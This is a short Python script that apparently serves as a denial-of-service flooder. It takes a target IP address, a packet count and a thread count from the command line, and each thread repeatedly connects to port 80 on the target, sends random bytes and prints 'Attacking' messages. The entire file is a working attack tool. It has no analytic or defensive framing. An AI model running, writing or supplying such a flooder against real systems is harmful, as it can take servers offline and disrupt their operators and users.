from ctypes import POINTER
import socket
import threading
import random
import sys
import os
import optparse
from optparse import *
import time


opt = optparse.OptionParser()

opt.add_option("-s", "--server", dest="target",
               help="-s Target's Server (IP Address)", type=str)
opt.add_option("-p", "--packet", dest="packet",
               help="-p Packets data to send to target", type=int)
opt.add_option("-t", "--time", dest="time",
               help="-t Attack duration (in seconds)", type=int)
opt.add_option("-n", "--thread", dest="thread",
               help="-n Thread to attack", type=int)

(values, keys) = opt.parse_args()

host = values.target
packet = values.packet
times = values.time
threads = values.thread


def main():
    r = random._urandom(10)
    u = int(0)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, 80))
            s.send(r)
            for x in range(packet):
                s.send(r)
                u += 1
                print("\033[92mSent: " +
                      str(u) + " \033[94m[-- Attacking " + host + " --]")
        except:
            s.close()
            print("\033[91mNo connection, server maybe down!")


for y in range(threads):
    thred = threading.Thread(target=main)
    thred.start()
